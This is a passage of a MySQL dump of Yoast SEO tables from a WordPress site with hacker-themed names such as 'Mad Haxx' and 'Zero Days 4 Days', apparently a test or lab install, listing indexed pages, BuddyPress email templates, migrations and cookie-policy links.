(8, 'http://exp-2-2/?p=1', '17:00297ed51eeea2e17964442608c29df4', 1, 'post', 'post', 1, 0, NULL, NULL, 'Hello world!', 'trash', 0, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2022-10-23 08:27:28', '2022-10-23 15:30:18', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 08:10:55', '2022-10-23 07:29:40'),
(9, 'http://exp-2-2/category/uncategorized/', '36:fdb08ee3998bf18ff1efdf3237994951', 1, 'term', 'category', NULL, NULL, NULL, NULL, 'Uncategorized', NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL, '2022-10-23 08:27:28', '2022-10-23 15:30:18', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, NULL, NULL),
(10, 'http://exp-2-2/category/mad-haxx/', '31:40dce66d8ca6deda89f20769530927c4', 3, 'term', 'category', NULL, NULL, NULL, NULL, 'Mad Haxx', NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL, '2022-10-23 08:27:28', '2022-10-23 15:30:18', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 08:43:08', '2022-02-18 08:13:53'),
(11, NULL, NULL, NULL, 'system-page', '404', NULL, NULL, 'Page not found %%sep%% %%sitename%%', NULL, 'Error 404: Page not found', NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, 0, 1, 0, 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2022-10-23 08:27:28', '2022-10-23 14:24:21', 1, NULL, NULL, NULL, NULL, 0, NULL, 1, NULL, NULL),
(12, NULL, NULL, NULL, 'system-page', 'search-result', NULL, NULL, 'You searched for %%searchphrase%% %%page%% %%sep%% %%sitename%%', NULL, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, 0, 1, 0, 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2022-10-23 08:27:28', '2022-10-23 15:30:18', 1, NULL, NULL, NULL, NULL, 0, NULL, 1, NULL, NULL),
(13, NULL, NULL, NULL, 'date-archive', NULL, NULL, NULL, '%%date%% %%page%% %%sep%% %%sitename%%', '', NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, 0, 1, 0, 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2022-10-23 08:27:28', '2022-10-23 15:30:18', 1, NULL, NULL, NULL, NULL, 0, NULL, 1, NULL, NULL),
(14, 'http://exp-2-2/', '13:70651ec39ce3b8766cba7f552128ba36', NULL, 'home-page', NULL, NULL, NULL, '%%sitename%% %%page%% %%sep%% %%sitedesc%%', 'Zero Days 4 Days', 'Home', NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, 0, 1, 0, 0, 0, 0, NULL, NULL, NULL, NULL, NULL, '%%sitename%%', '', '', '0', NULL, NULL, NULL, NULL, NULL, '2022-10-23 08:27:28', '2022-10-23 16:13:23', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 16:13:23', '2022-02-18 08:13:53'),
(15, 'http://exp-2-2/cookie-policy-eu/', '30:a2ca91d16755c8a2c03916dc56b5dc1e', 19, 'post', 'page', 1, 0, NULL, NULL, 'Cookie Policy (EU)', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, NULL, NULL, '2022-10-23 08:34:16', '2022-10-23 15:30:18', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 08:34:18', '2022-10-23 08:34:16'),
(16, 'http://exp-2-2/author/user1/', '26:0775717d800b80fd4d47258a6ce27e2c', 2, 'user', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, 'https://2.gravatar.com/avatar/8a78fe75a3b8f04d77328927de5c5f74?s=500&d=mm&r=g', NULL, NULL, 'gravatar-image', NULL, NULL, 'https://2.gravatar.com/avatar/8a78fe75a3b8f04d77328927de5c5f74?s=500&d=mm&r=g', NULL, 'gravatar-image', NULL, NULL, NULL, NULL, '2022-10-23 08:41:09', '2022-10-23 16:42:51', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, NULL, NULL),
(18, 'http://exp-2-2/gwolle_gb-2/', '25:a195c66a9a2aa5600ed3a38bcdf422a5', 22, 'post', 'page', 1, 0, NULL, NULL, 'Guestbook &#8211; Leave R3kt Sec a ❤', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL, '2022-10-23 14:05:47', '2022-10-23 14:32:40', 1, NULL, NULL, NULL, NULL, 0, 1, 2, '2022-10-23 14:06:48', '2022-10-23 14:05:47'),
(19, NULL, NULL, 27, 'post', 'nav_menu_item', 1, 0, NULL, NULL, '', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL, '2022-10-23 14:08:49', '2022-10-23 14:23:17', 1, NULL, NULL, NULL, NULL, 0, NULL, 0, '2022-10-23 14:08:49', '2022-10-23 14:08:49'),
(20, NULL, NULL, 28, 'post', 'nav_menu_item', 1, 0, NULL, NULL, 'Home', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL, '2022-10-23 14:08:49', '2022-10-23 14:23:17', 1, NULL, NULL, NULL, NULL, 0, NULL, 0, '2022-10-23 14:08:49', '2022-10-23 14:08:49'),
(21, NULL, NULL, 26, 'post', 'customize_changeset', 1, 0, NULL, NULL, '', 'trash', 0, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2022-10-23 14:08:49', '2022-10-23 14:23:17', 1, NULL, NULL, NULL, NULL, 0, NULL, 0, '2022-10-23 14:08:49', '2022-10-23 14:08:49'),
(22, NULL, NULL, 30, 'post', 'nav_menu_item', 1, 0, NULL, NULL, '', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL, '2022-10-23 14:09:32', '2022-10-23 14:23:17', 1, NULL, NULL, NULL, NULL, 0, NULL, 0, '2022-10-23 14:09:32', '2022-10-23 14:09:32'),
(23, NULL, NULL, 29, 'post', 'customize_changeset', 1, 0, NULL, NULL, '', 'trash', 0, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2022-10-23 14:09:33', '2022-10-23 14:23:17', 1, NULL, NULL, NULL, NULL, 0, NULL, 0, '2022-10-23 14:09:32', '2022-10-23 14:09:32'),
(26, 'http://exp-2-2/activity/', '22:2503f4bfe57b25ab03f6a5a26a5e4df4', 33, 'post', 'page', 1, 0, NULL, NULL, 'Activity', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 15:44:16', '2022-10-23 15:44:16'),
(27, 'http://exp-2-2/members/', '21:65e1cbb3a3ac33c59d97ed84687a491a', 34, 'post', 'page', 1, 0, NULL, NULL, 'Members', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 15:44:16', '2022-10-23 15:44:16'),
(28, 'http://exp-2-2/register/', '22:a5fc761c2380728ac025d674b62302a9', 35, 'post', 'page', 1, 0, NULL, NULL, 'Register', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 15:44:16', '2022-10-23 15:44:16'),
(29, 'http://exp-2-2/activate/', '22:6d9f8e3cff57379800114963131f56e3', 36, 'post', 'page', 1, 0, NULL, NULL, 'Activate', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 15:44:16', '2022-10-23 15:44:16'),
(30, 'http://exp-2-2/?post_type=bp-email&p=37', '37:b687468b04b715888ddd98c3f9fcb1d7', 37, 'post', 'bp-email', 1, 0, NULL, NULL, '[{{{site.name}}}] Welcome!', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, NULL, NULL, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 15:44:16', '2022-10-23 15:44:16'),
(31, 'http://exp-2-2/?post_type=bp-email&p=38', '37:95d6db7f50b36e09f6a2462473220028', 38, 'post', 'bp-email', 1, 0, NULL, NULL, '[{{{site.name}}}] {{poster.name}} replied to one of your updates', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, NULL, NULL, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 15:44:16', '2022-10-23 15:44:16'),
(32, 'http://exp-2-2/?post_type=bp-email&p=39', '37:225afefe6b5fff7354e1dd1a7f8d60fd', 39, 'post', 'bp-email', 1, 0, NULL, NULL, '[{{{site.name}}}] {{poster.name}} replied to one of your comments', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, NULL, NULL, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 15:44:16', '2022-10-23 15:44:16'),
(33, 'http://exp-2-2/?post_type=bp-email&p=40', '37:1bcf0f13580cd65b40082f5a74d29ab3', 40, 'post', 'bp-email', 1, 0, NULL, NULL, '[{{{site.name}}}] {{poster.name}} mentioned you in a status update', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, NULL, NULL, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 15:44:16', '2022-10-23 15:44:16'),
(34, 'http://exp-2-2/?post_type=bp-email&p=41', '37:56064d44fafc19909abad4cd3aec5fc8', 41, 'post', 'bp-email', 1, 0, NULL, NULL, '[{{{site.name}}}] {{poster.name}} mentioned you in an update', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, NULL, NULL, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 15:44:16', '2022-10-23 15:44:16'),
(35, 'http://exp-2-2/?post_type=bp-email&p=42', '37:2605b8cbf40e03621d4bdfd34b3c19b1', 42, 'post', 'bp-email', 1, 0, NULL, NULL, '[{{{site.name}}}] Activate your account', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, NULL, NULL, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 15:44:16', '2022-10-23 15:44:16'),
(36, 'http://exp-2-2/?post_type=bp-email&p=43', '37:830f752a98a44282ae125c17c6f7b58a', 43, 'post', 'bp-email', 1, 0, NULL, NULL, '[{{{site.name}}}] New friendship request from {{initiator.name}}', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, NULL, NULL, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 15:44:16', '2022-10-23 15:44:16'),
(37, 'http://exp-2-2/?post_type=bp-email&p=44', '37:fcc69de151c351867bfceeaf5258f0e5', 44, 'post', 'bp-email', 1, 0, NULL, NULL, '[{{{site.name}}}] {{friend.name}} accepted your friendship request', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, NULL, NULL, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 15:44:16', '2022-10-23 15:44:16'),
(38, 'http://exp-2-2/?post_type=bp-email&p=45', '37:74d31d6272e1877e887be5633d505c56', 45, 'post', 'bp-email', 1, 0, NULL, NULL, '[{{{site.name}}}] Group details updated', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, NULL, NULL, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 15:44:16', '2022-10-23 15:44:16'),
(39, 'http://exp-2-2/?post_type=bp-email&p=46', '37:ff461658550a5ecee81f4e257d47bbd5', 46, 'post', 'bp-email', 1, 0, NULL, NULL, '[{{{site.name}}}] You have an invitation to the group: &#8220;{{group.name}}&#8221;', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 3, NULL, NULL, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 15:44:16', '2022-10-23 15:44:16'),
(40, 'http://exp-2-2/?post_type=bp-email&p=47', '37:82e7ba60e983def1ab300762fdb942c5', 47, 'post', 'bp-email', 1, 0, NULL, NULL, '[{{{site.name}}}] You have been promoted in the group: &#8220;{{group.name}}&#8221;', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, NULL, NULL, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 15:44:16', '2022-10-23 15:44:16'),
(41, 'http://exp-2-2/?post_type=bp-email&p=48', '37:531454663c9b7dab140c123fc61902a8', 48, 'post', 'bp-email', 1, 0, NULL, NULL, '[{{{site.name}}}] Membership request for group: {{group.name}}', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, NULL, NULL, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 15:44:16', '2022-10-23 15:44:16'),
(42, 'http://exp-2-2/?post_type=bp-email&p=49', '37:a7b7c23ccc1d9c6fb24e1f1b91bf47c3', 49, 'post', 'bp-email', 1, 0, NULL, NULL, '[{{{site.name}}}] New message from {{sender.name}}', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, NULL, NULL, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 15:44:16', '2022-10-23 15:44:16'),
(43, 'http://exp-2-2/?post_type=bp-email&p=50', '37:5eb7d65dbb1e9358c404bff1a61c6c87', 50, 'post', 'bp-email', 1, 0, NULL, NULL, '[{{{site.name}}}] Verify your new email address', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, NULL, NULL, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 15:44:16', '2022-10-23 15:44:16'),
(44, 'http://exp-2-2/?post_type=bp-email&p=51', '37:66e793e32309dc1e4a8b04db57ccea2f', 51, 'post', 'bp-email', 1, 0, NULL, NULL, '[{{{site.name}}}] Membership request for group &#8220;{{group.name}}&#8221; accepted', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, NULL, NULL, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 15:44:16', '2022-10-23 15:44:16'),
(45, 'http://exp-2-2/?post_type=bp-email&p=52', '37:2677c9575186e23c8901e42724b23433', 52, 'post', 'bp-email', 1, 0, NULL, NULL, '[{{{site.name}}}] Membership request for group &#8220;{{group.name}}&#8221; rejected', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, NULL, NULL, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 15:44:16', '2022-10-23 15:44:16'),
(46, 'http://exp-2-2/?post_type=bp-email&p=53', '37:2f5c6fa93b7713c602b052e2c0625705', 53, 'post', 'bp-email', 1, 0, NULL, NULL, '{{inviter.name}} has invited you to join {{site.name}}', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 3, NULL, NULL, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 15:44:16', '2022-10-23 15:44:16'),
(47, 'http://exp-2-2/?post_type=bp-email&p=54', '37:e080d5dc85f739810ad55884a8947a06', 54, 'post', 'bp-email', 1, 0, NULL, NULL, '{{requesting-user.user_login}} would like to join {{site.name}}', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, NULL, NULL, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 15:44:16', '2022-10-23 15:44:16'),
(48, 'http://exp-2-2/?post_type=bp-email&p=55', '37:9177dd14c681241f6b418f4de0eee752', 55, 'post', 'bp-email', 1, 0, NULL, NULL, 'Your request to join {{site.name}} has been declined', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL, '2022-10-23 15:44:16', '2022-10-23 15:44:16', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 15:44:16', '2022-10-23 15:44:16'),
(50, 'http://exp-2-2/?page_id=57', '24:793534bdb036922e7b70f9f860a2d80e', 57, 'post', 'page', 1, 0, NULL, NULL, 'Events', 'trash', 0, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL, '2022-10-23 15:48:03', '2022-10-23 16:13:00', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 16:13:00', '2022-10-23 15:48:02'),
(52, 'http://exp-2-2/events/', '20:6ad981d0934e7ddb266d339dbb6c63b3', 60, 'post', 'page', 1, 0, NULL, NULL, 'Events', 'publish', NULL, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL, '2022-10-23 16:13:23', '2022-10-23 16:13:23', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 16:13:23', '2022-10-23 16:13:23'),
(53, 'http://exp-2-2/author/test_admin_1337/', '36:b4efd9afa16d99aec3bf433f03b94dc0', 3, 'user', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, 'https://1.gravatar.com/avatar/707073c96a20af9777b94d7acd5bb877?s=500&d=mm&r=g', NULL, NULL, 'gravatar-image', NULL, NULL, 'https://1.gravatar.com/avatar/707073c96a20af9777b94d7acd5bb877?s=500&d=mm&r=g', NULL, 'gravatar-image', NULL, NULL, NULL, NULL, '2022-10-23 16:43:02', '2022-10-23 16:43:02', 1, NULL, NULL, NULL, NULL, 0, NULL, 2, '2022-10-23 16:43:02', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `wp_yoast_indexable_hierarchy`
--

CREATE TABLE `wp_yoast_indexable_hierarchy` (
  `indexable_id` int(11) UNSIGNED NOT NULL,
  `ancestor_id` int(11) UNSIGNED NOT NULL,
  `depth` int(11) UNSIGNED DEFAULT NULL,
  `blog_id` bigint(20) NOT NULL DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `wp_yoast_indexable_hierarchy`
--

INSERT INTO `wp_yoast_indexable_hierarchy` (`indexable_id`, `ancestor_id`, `depth`, `blog_id`) VALUES
(1, 0, 0, 1),
(2, 0, 0, 1),
(3, 0, 0, 1),
(4, 0, 0, 1),
(5, 0, 0, 1),
(6, 0, 0, 1),
(7, 0, 0, 1),
(8, 0, 0, 1),
(9, 0, 0, 1),
(10, 0, 0, 1),
(11, 0, 0, 1),
(14, 0, 0, 1),
(15, 0, 0, 1),
(16, 0, 0, 1),
(18, 0, 0, 1),
(21, 0, 0, 1),
(23, 0, 0, 1),
(50, 0, 0, 1),
(52, 0, 0, 1),
(53, 0, 0, 1);

-- --------------------------------------------------------

--
-- Table structure for table `wp_yoast_migrations`
--

CREATE TABLE `wp_yoast_migrations` (
  `id` int(11) UNSIGNED NOT NULL,
  `version` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `wp_yoast_migrations`
--

INSERT INTO `wp_yoast_migrations` (`id`, `version`) VALUES
(1, '20171228151840'),
(2, '20171228151841'),
(3, '20190529075038'),
(4, '20191011111109'),
(5, '20200408101900'),
(6, '20200420073606'),
(7, '20200428123747'),
(8, '20200428194858'),
(9, '20200429105310'),
(10, '20200430075614'),
(11, '20200430150130'),
(12, '20200507054848'),
(13, '20200513133401'),
(14, '20200609154515'),
(15, '20200616130143'),
(16, '20200617122511'),
(17, '20200702141921'),
(18, '20200728095334'),
(19, '20201202144329'),
(20, '20201216124002'),
(21, '20201216141134'),
(22, '20210817092415'),
(23, '20211020091404');

-- --------------------------------------------------------

--
-- Table structure for table `wp_yoast_primary_term`
--

CREATE TABLE `wp_yoast_primary_term` (
  `id` int(11) UNSIGNED NOT NULL,
  `post_id` bigint(20) DEFAULT NULL,
  `term_id` bigint(20) DEFAULT NULL,
  `taxonomy` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  `blog_id` bigint(20) NOT NULL DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_yoast_seo_links`
--

CREATE TABLE `wp_yoast_seo_links` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `url` varchar(255) DEFAULT NULL,
  `post_id` bigint(20) UNSIGNED DEFAULT NULL,
  `target_post_id` bigint(20) UNSIGNED DEFAULT NULL,
  `type` varchar(8) DEFAULT NULL,
  `indexable_id` int(11) UNSIGNED DEFAULT NULL,
  `target_indexable_id` int(11) UNSIGNED DEFAULT NULL,
  `height` int(11) UNSIGNED DEFAULT NULL,
  `width` int(11) UNSIGNED DEFAULT NULL,
  `size` int(11) UNSIGNED DEFAULT NULL,
  `language` varchar(32) DEFAULT NULL,
  `region` varchar(32) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

--
-- Dumping data for table `wp_yoast_seo_links`
--

INSERT INTO `wp_yoast_seo_links` (`id`, `url`, `post_id`, `target_post_id`, `type`, `indexable_id`, `target_indexable_id`, `height`, `width`, `size`, `language`, `region`) VALUES
(1, 'http://localhost', 19, NULL, 'internal', 15, NULL, NULL, NULL, NULL, NULL, NULL),
(2, 'https://cookiedatabase.org/service/google-recaptcha/', 19, NULL, 'external', 15, NULL, NULL, NULL, NULL, NULL, NULL),
(3, 'https://policies.google.com/privacy', 19, NULL, 'external', 15, NULL, NULL, NULL, NULL, NULL, NULL),
(4, 'https://cookiedatabase.org/cookie/google-recaptcha/_grecaptcha/', 19, NULL, 'external', 15, NULL, NULL, NULL, NULL, NULL, NULL),
(5, 'https://cookiedatabase.org/cookie/google-recaptcha/rcc/', 19, NULL, 'external', 15, NULL, NULL, NULL, NULL, NULL, NULL),
(6, 'https://cookiedatabase.org/cookie/google-recaptcha/rcb/', 19, NULL, 'external', 15, NULL, NULL, NULL, NULL, NULL, NULL),
(7, 'https://cookiedatabase.org/cookie/google-recaptcha/rca/', 19, NULL, 'external', 15, NULL, NULL, NULL, NULL, NULL, NULL),
(8, 'https://cookiedatabase.org/service/drift/', 19, NULL, 'external', 15, NULL, NULL, NULL, NULL, NULL, NULL),
(9, 'https://gethelp.drift.com/hc/en-us/articles/360019665133-What-is-Drift-s-Cookie-Security-and-Privacy-Policy-', 19, NULL, 'external', 15, NULL, NULL, NULL, NULL, NULL, NULL),
(10, 'https://cookiedatabase.org/cookie/drift/driftt_aid/', 19, NULL, 'external', 15, NULL, NULL, NULL, NULL, NULL, NULL),
(11, 'https://cookiedatabase.org/service/google-analytics/', 19, NULL, 'external', 15, NULL, NULL, NULL, NULL, NULL, NULL),
(12, 'https://policies.google.com/privacy', 19, NULL, 'external', 15, NULL, NULL, NULL, NULL, NULL, NULL),
(13, 'https://cookiedatabase.org/cookie/google-analytics/_ga/', 19, NULL, 'external', 15, NULL, NULL, NULL, NULL, NULL, NULL),
(14, 'https://cookiedatabase.org/service/wordpress/', 19, NULL, 'external', 15, NULL, NULL, NULL, NULL, NULL, NULL),
(15, 'https://cookiedatabase.org/cookie/wordpress/wordpress_test_cookie/', 19, NULL, 'external', 15, NULL, NULL, NULL, NULL, NULL, NULL),
(16, 'https://cookiedatabase.org/cookie/wordpress/wp_lang/', 19, NULL, 'external', 15, NULL, NULL, NULL, NULL, NULL, NULL),
